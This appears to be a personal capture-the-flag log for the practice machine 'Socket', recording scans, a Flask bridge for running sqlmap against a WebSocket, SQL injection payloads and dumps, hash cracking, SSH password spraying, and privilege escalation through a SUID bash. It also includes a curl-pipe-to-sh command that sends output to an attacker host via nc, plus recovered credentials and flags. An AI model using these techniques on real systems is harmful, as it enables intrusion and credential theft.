@@ -1,0 +1,584 @@
+2023-04-09 05:28:16 GMT -- START TIME
+
+### Socket ###
+----------------------------------------
+|================================================================
+- Name: socket 
+- IP Address: 10.10.11.206 
+- OS: Ubuntu 22.04.2 LTS
+- Notes:
+// SQLite Creds:
+// admin	:	denjanjade122566 (0c090c365fa0559b151a43e0fea39710)
+ 
+//CREDS:
+// tkeller	:	denjanjade122566
+
+//Flags:
+//User:		2ecb65d2b1cabc6530955ac411982657
+//System:	f45eeb884893f0d21d2c4560b01e6da7	
+
+|================================================================
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// nmap --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+// SCAN
+2023-04-09 05:35:20 GMT -- 
+ip=10.10.11.206
+
+ports=$(nmap -e tun0 -Pn -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+
+echo $ports
+//22,80,5789
+
+2023-04-09 05:37:05 GMT -- 
+nmap -e tun0 -Pn -A --script=default,vuln -p$ports $ip -oN vuln.nmap
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
+|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.52
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+| http-server-header: 
+|   Apache/2.4.52 (Ubuntu)
+|_  Werkzeug/2.1.2 Python/3.10.6
+5789/tcp open  unknown
+| fingerprint-strings: 
+|   GenericLines, GetRequest, HTTPOptions: 
+|     HTTP/1.1 400 Bad Request
+|     Date: Tue, 11 Apr 2023 03:39:00 GMT
+|     Server: Python/3.10 websockets/10.4
+|     Content-Length: 77
+|     Content-Type: text/plain
+|     Connection: close
+|     Failed to open a WebSocket connection: did not receive a valid HTTP request.
+|   Help: 
+|     HTTP/1.1 400 Bad Request
+|     Date: Tue, 11 Apr 2023 03:39:16 GMT
+|     Server: Python/3.10 websockets/10.4
+|     Content-Length: 77
+|     Content-Type: text/plain
+|     Connection: close
+|     Failed to open a WebSocket connection: did not receive a valid HTTP request.
+|   RTSPRequest: 
+|     HTTP/1.1 400 Bad Request
+|     Date: Tue, 11 Apr 2023 03:39:01 GMT
+|     Server: Python/3.10 websockets/10.4
+|     Content-Length: 77
+|     Content-Type: text/plain
+|     Connection: close
+|     Failed to open a WebSocket connection: did not receive a valid HTTP request.
+|   SSLSessionReq: 
+|     HTTP/1.1 400 Bad Request
+|     Date: Tue, 11 Apr 2023 03:39:17 GMT
+|     Server: Python/3.10 websockets/10.4
+|     Content-Length: 77
+|     Content-Type: text/plain
+|     Connection: close
+|_    Failed to open a WebSocket connection: did not receive a valid HTTP request.
+
+# UDP scan
+2023-04-09 05:38:13 GMT -- 
+sudo nmap -e tun0 -Pn -sU --top-ports 100 $ip -oN udp.nmap
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+-- add /etc/hosts file entries --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+# add /etc/hosts entry nix
+sudo sh -c "echo '10.10.11.206\t qreader.htb' >> /etc/hosts"
+cat /etc/hosts
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// 80/tcp   open  http    Apache httpd 2.4.52
+//QReader
+//Simple tool, to extract and embed text in QR codes
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//BURP
+http://qreader.htb
+//Nothing of interest in HTTP history on main page.
+
+http://qreader.htb:5789/
+//Failed to open a WebSocket connection: invalid Connection header: close.
+//You cannot access a WebSocket server directly with a browser. You need a WebSocket client.
+
+// nikto -- 
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// scan website
+2023-04-09 05:44:17 GMT -- 
+nikto -h http://10.10.11.206 -o nikto_scan.txt
+//+ Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+// gobuster --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// directory brute force
+2023-04-09 05:53:41 GMT -- 
+gobuster dir -u http://qreader.htb -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,htm -o gobuster-80.txt
+
+/report               (Status: 200) [Size: 4161]
+
+// vhost brute force
+2023-04-09 05:57:38 GMT -- 
+gobuster vhost -u qreader.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -o vhosts-80.txt
+//A bunch of redirects
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+// feroxbuster
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+feroxbuster -u http://qreader.htb
+
+200      GET      228l      638w     6992c http://qreader.htb/
+200      GET      197l      302w     4161c http://qreader.htb/report
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// RE on linux binary [FAIL]
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//Download the offline App from the site
+2023-04-11 03:33:18 GMT -- 
+//Click link on webpage to download binary
+// http://qreader.htb/download/linux 
+
+mv ~/Downloads/QReader_lin_v0.0.2.zip ~/haxterm/data/10.10.11.206
+unzip QReader_lin_v0.0.2.zip
+mv app/qreader .
+
+file qreader
+//qreader: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3f71fafa6e2e915b9bed491dd97e1bab785158de, for GNU/Linux 2.6.32, stripped
+
+chmod +x qreader
+
+2023-04-11 03:33:27 GMT -- 
+./qreader
+//Launches qreader
+
+//Under About tab, the Versions and Updates seems to get
+// [ERROR] Connection Error!
+
+//Can't find anything in wireshark.
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// WebSocket Enum
+// 5789/tcp open  unknown
+//Server: Python/3.10 websockets/10.4 
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+Websockets are a protocol designed to allow for two way communication over a single TCP connect at layer seven. It’s a way for pages delivered over HTTP to start and maintain connections and communication without initiating the connection each time.
+
+2023-04-11 04:49:59 GMT -- 
+python3 -m websockets ws://qreader.htb:5789 
+Connected to ws://qreader.htb:5789.
+//Send empty JSON to find parameters
+> {}
+< {"paths": {"/update": "Check for updates", "/version": "Get version information"}}
+Connection closed: 1000 (OK).
+
+//wscat(node-ws) can also be used to connect to WebSocket
+//wscat --connect ws://qreader.htb:5789 --execute {}
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Find SQLi in WebSockets
+// sqlmap + flask method
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+//An alternative to doing the SQL injections manually would be to use the power of something like sqlpmap to enumerate this database.
+//At this time, there isn’t a way to target a websocket connection in sqlmap.
+//Lets write a simple Flask webserver that will get a request with a single parameter, and use that to make the websocket connection with that parameter as the injection.
+//This allows sqlmap to see a standard HTTP server, but then it does the websockets injection.
+
+
+// flask2ws.py
+// Using version param found from the enum
+// NOTE: The update param didn't seem to have an SQLi
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+#!/usr/bin/env python3
+
+import json
+import signal
+import websocket
+from flask import *
+
+
+app = Flask(__name__)
+
+
+@app.route("/")
+def index():
+    ws = websocket.create_connection('ws://qreader.htb:5789/version')
+    params = request.args['params']
+	#Need to make sure it renders the ' properly
+	params = params.replace("'","\'")
+	print(params)
+    ws.send(json.dumps({'version': params}))
+    data = ws.recv()
+	print(data)
+    return data
+
+
+if __name__ == "__main__":
+    app.run(debug=True)
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+2023-04-11 05:10:32 GMT -- 
+python3 flask2ws.py
+* Serving Flask app 'flask2ws'
+* Running on http://127.0.0.1:5000
+
+// Run sqlmap
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2023-04-11 05:13:08 GMT -- 
+sqlmap -u http://127.0.0.1:5000/?params=1 --timeout 1 --ignore-timeouts --level=5 --risk=3 --batch
+
+...
+[07:02:08] [INFO] GET parameter 'params' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable 
+[07:02:19] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite' 
+it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+...
+[07:02:36] [INFO] GET parameter 'params' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+...
+sqlmap identified the following injection point(s) with a total of 270 HTTP(s) requests:
+---
+Parameter: params (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: params=1" OR NOT 3595=3595-- OVET
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: params=1" UNION ALL SELECT CHAR(113,106,120,107,113)||CHAR(101,121,72,103,101,104,73,99,67,119,88,106,70,113,87,97,73,69,80,103,98,113,70,113,72,81,107,122,110,114,105,111,78,72,88,116,98,90,101,73)||CHAR(113,98,120,118,113),NULL,NULL,NULL-- gvEV
+
+sqlmap identified the following injection point(s) with a total of 270 HTTP(s) requests:
+---
+Parameter: params (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: params=1" OR NOT 3595=3595-- OVET
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+
+2023-04-11 06:06:29 GMT -- 
+sqlmap -u http://127.0.0.1:5000/?params=1 --dbs
+//[07:07:36] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
+
+2023-04-11 06:09:06 GMT -- 
+sqlmap -u http://127.0.0.1:5000/?params=1 --tables
+
++-----------------+
+| answers         |
+| info            |
+| reports         |
+| sqlite_sequence |
+| users           |
+| versions        |
++-----------------+
+
+2023-04-11 06:10:07 GMT -- 
+sqlmap -u http://127.0.0.1:5000/?params=1 -T answers --dump
++----+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+-------------+---------------+
+| id | answer                                                                                                                                                                        | status  | answered_by | answered_date |
++----+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+-------------+---------------+
+| 1  | Hello Json,\\n\\nAs if now we support PNG formart only. We will be adding JPEG/SVG file formats in our next version.\\n\\nThomas Keller                                       | PENDING | admin       | 17/08/2022    |
+| 2  | Hello Mike,\\n\\n We have confirmed a valid problem with handling non-ascii charaters. So we suggest you to stick with ascci printable characters for now!\\n\\nThomas Keller | PENDING | admin       | 25/09/2022    |
++----+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+-------------+---------------+
+
+2023-04-11 06:13:34 GMT -- 
+sqlmap -u http://127.0.0.1:5000/?params=1 -T info --dump
++----+-------------+-------+
+| id | key         | value |
++----+-------------+-------+
+| 1  | downloads   | 1000  |
+| 2  | convertions | 2289  |
++----+-------------+-------+
+
+2023-04-11 06:13:49 GMT -- 
+sqlmap -u http://127.0.0.1:5000/?params=1 -T reports --dump
++----+---------------------------+---------------------------------------------------------------------------------------------------------------------+---------------+---------------+
+| id | subject                   | description                                                                                                         | reported_date | reporter_name |
++----+---------------------------+---------------------------------------------------------------------------------------------------------------------+---------------+---------------+
+| 1  | Accept JPEG files         | Is there a way to convert JPEG images with this tool? Or should I convert my JPEG to PNG and then use it?           | 13/08/2022    | Jason         |
+| 2  | Converting non-ascii text | When I try to embed non-ascii text, it always gives me an error. It would be nice if you could take a look at this. | 22/09/2022    | Mike          |
++----+---------------------------+---------------------------------------------------------------------------------------------------------------------+---------------+---------------+
+
+2023-04-11 06:28:05 GMT -- 
+sqlmap -u http://127.0.0.1:5000/?params=1 -T users --dump
+[07:27:31] [INFO] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
+[07:27:33] [INFO] writing hashes to a temporary file '/tmp/sqlmap95bmbplv68223/sqlmaphashes-0gjrhv4x.txt'
+
++----+-------+----------------------------------+----------+
+| id | role  | password                         | username |
++----+-------+----------------------------------+----------+
+| 1  | admin | 0c090c365fa0559b151a43e0fea39710 | admin    |
++----+-------+----------------------------------+----------+
+
+mv /tmp/sqlmap95bmbplv68223/sqlmaphashes-0gjrhv4x.txt ~/haxterm/data/10.10.11.206/admin.hash
+
+2023-04-11 06:28:08 GMT -- 
+sqlmap -u http://127.0.0.1:5000/?params=1 -T versions --dump
++----+---------+-----------+---------------+
+| id | version | downloads | released_date |
++----+---------+-----------+---------------+
+| 1  | 0.0.1   | 280       | 12/07/2022    |
+| 2  | 0.0.2   | 720       | 26/09/2022    |
++----+---------+-----------+---------------+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+//HASH:
+//admin:0c090c365fa0559b151a43e0fea39710
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Crack Hash
+//admin:0c090c365fa0559b151a43e0fea39710
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-11 06:35:57 GMT -- 
+hash-identifer 0c090c365fa0559b151a43e0fea39710
+Possible Hashs:
+[+] MD5
+[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
+
+2023-04-11 06:37:07 GMT -- 
+hashid -j 0c090c365fa0559b151a43e0fea39710
+[+] MD5 [JtR Format: raw-md5]
+[+] Domain Cached Credentials [JtR Format: mscach]
+[+] Domain Cached Credentials 2 [JtR Format: mscach2]
+
+2023-04-11 06:37:45 GMT -- 
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 admin.hash
+
+//CREDS:
+//denjanjade122566 (admin)
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+NOTE: I have a password for the SQLite database for the admin user, need to find the actual password for the box
+In the database answers, an admin name Thomas Keller responed to other users.
+
+
+// Enum Username
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//Build Admin username list
+2023-04-11 07:41:21 GMT -- 
+wget https://raw.githubusercontent.com/krlsio/python/main/namemash.py
+
+echo 'Thomas Keller' > username
+
+python3 namemash.py name > user.lst
+
+#cat user.lst
+thomaskeller
+kellerthomas
+thomas.keller
+keller.thomas
+kellert
+tkeller
+kthomas
+t.keller
+k.thomas
+thomas
+keller
+
+2023-04-11 07:41:25 GMT -- 
+crackmapexec ssh 10.10.11.206 -u user.lst -p denjanjade122566
+//[+] tkeller:denjanjade122566
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// SSH-Connect
+//22/tcp   open  ssh
+//OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+//CREDS: admin:denjanjade122566
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2023-04-11 07:48:10 GMT -- 
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" tkeller@10.10.11.206
+
+id 
+uid=1001(tkeller) gid=1001(tkeller) groups=1001(tkeller),1002(shared)
+
+//SUCCESS
+
+cat user.txt 
+//2ecb65d2b1cabc6530955ac411982657
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
+// Priv-Esc
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-11 07:51:45 GMT -- 
+sudo -ll
+
+Sudoers entry:
+    RunAsUsers: ALL
+    RunAsGroups: ALL
+    Options: !authenticate
+    Commands:
+        /usr/local/sbin/build-installer.sh
+
+
+2023-04-11 08:02:00 GMT -- 
+ls -lah /usr/local/sbin/build-installer.sh
+-rwxr-xr-x 1 root root 1.1K Feb 17 11:41 /usr/local/sbin/build-installer.sh
+
+/usr/local/sbin/build-installer.sh
+No enough arguments supplied
+
+// build-installer.sh (Move to linpeas to be quick)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+#!/bin/bash
+if [ $# -ne 2 ] && [[ $1 != 'cleanup' ]]; then
+  /usr/bin/echo "No enough arguments supplied"
+  exit 1;
+fi
+
+action=$1
+name=$2
+ext=$(/usr/bin/echo $2 |/usr/bin/awk -F'.' '{ print $(NF) }')
+
+if [[ -L $name ]];then
+  /usr/bin/echo 'Symlinks are not allowed'
+  exit 1;
+fi
+
+if [[ $action == 'build' ]]; then
+  if [[ $ext == 'spec' ]] ; then
+    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
+    /home/svc/.local/bin/pyinstaller $name
+    /usr/bin/mv ./dist ./build /opt/shared
+  else
+    echo "Invalid file format"
+    exit 1;
+  fi
+elif [[ $action == 'make' ]]; then
+  if [[ $ext == 'py' ]] ; then
+    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
+    /root/.local/bin/pyinstaller -F --name "qreader" $name --specpath /tmp
+   /usr/bin/mv ./dist ./build /opt/shared
+  else
+    echo "Invalid file format"
+    exit 1;
+  fi
+elif [[ $action == 'cleanup' ]]; then
+  /usr/bin/rm -r ./build ./dist 2>/dev/null
+  /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
+  /usr/bin/rm /tmp/qreader* 2>/dev/null
+else
+  /usr/bin/echo 'Invalid action'
+  exit 1;
+fi
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+/usr/local/sbin/build-installer.sh <action> <name>
+//Actions: build, make, cleanup
+
+
+// linpeas
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// privesc --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// install peass
+sudo apt install -y peass
+
+// get a copy of linpeas shell script or binary
+cp /usr/share/peass/linpeas/linpeas.sh .
+
+// download, execute from memory, & save output on kali
+  // kali term1
+sudo python3 -m http.server 443
+  // kali term2
+nc -lvnp 9002 | tee linpeas.out
+  // target
+curl 10.10.16.8:443/linpeas.sh | sh | nc 10.10.16.8 6969
+
+// view linpeas output
+less -R linpeas.out
+
+╔══════════╣ CVEs Check
+Potentially Vulnerable to CVE-2022-0847                                       
+Potentially Vulnerable to CVE-2022-2588
+
+-rwsr-xr-x 1 root root 1.4M Jan  6  2022 /usr/bin/bash
+//Suid Bit set on Bash
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+https://gtfobins.github.io/gtfobins/bash/#suid
+
+2023-04-11 08:45:48 GMT -- 
+bash -p
+//If the -p option is sup‐plied at invocation, the startup behavior is the same, but the effective user id is not reset.
+
+2023-04-11 08:46:04 GMT -- 
+cat /root/root.txt
+//f45eeb884893f0d21d2c4560b01e6da7
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+#PWNED
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡶⠶⠖⠛⠛⠛⠳⠶⠶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢀⣴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢠⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⠀⠉⢿⡀⠀⠀⠀⠀⠀⠀⣠⡶⠶⣄⠀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⢠⡿⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⣰⠇⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⢸⠏⠀⠀⢸⡆⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⢀⣾⠀⠀⠀⠀⠀⢰⣿⠀⠀⠀⣸⠁⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⠀⣠⡾⠁⠀⠀⠀⠀⠀⠈⢿⡀⠒⣰⡏⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⢰⡟⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠶⠟⠋⣠⡴⠶⠟⠒⢶⣄⠀⠈⠉⠉⠉⠀⠀⢠⡿⡀⠀⠀⠀⢀⣶⠶⣦⠀⠀
+⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⢠⡟⢻⡏⢤⣟⡄⠀
+⢰⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠁⠀⠀⠘⠿⠚⠻⠾⠋⠁⠀
+⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢀⣤⣤⣤⡀
+⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⣿⠹⣗⡆⣸⡇
+⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠀⠻⠖⠷⣧⠟⠀
+⡏⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⠀⠀⠀⠀⠀⠈⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⠀⠀⢸⡆⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡦⠄⢹⡆⠀⠀⠀⠀⠀⠀⠀
+⣿⠀⠀⠈⣿⠀⠀⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡓⠚⠃⠀⠀⠀⠀⠀⠀⠀
+⢹⡄⠀⠀⢻⣆⣂⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⢸⡇⠀⠀⠀⠙⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡆⠀⠀⠀⠀⠀⠀⠀⠀
+⠘⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠘⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢄⣾⠁⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⢀⡀⠀⠀⢀⣼⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠙⢧⣀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡇⠀⠀⠀⠀⠀⣠⣾⡇⠀⠀⠀⠀⣠⣾⣥⣤⡴⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠙⠷⢦⣤⣀⣀⣠⡴⠟⠉⠛⠶⠦⠤⠶⠾⠋⠉⠛⠓⠶⠚⠋⠉
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+2023-04-11 08:46:04 GMT -- COMPLETE
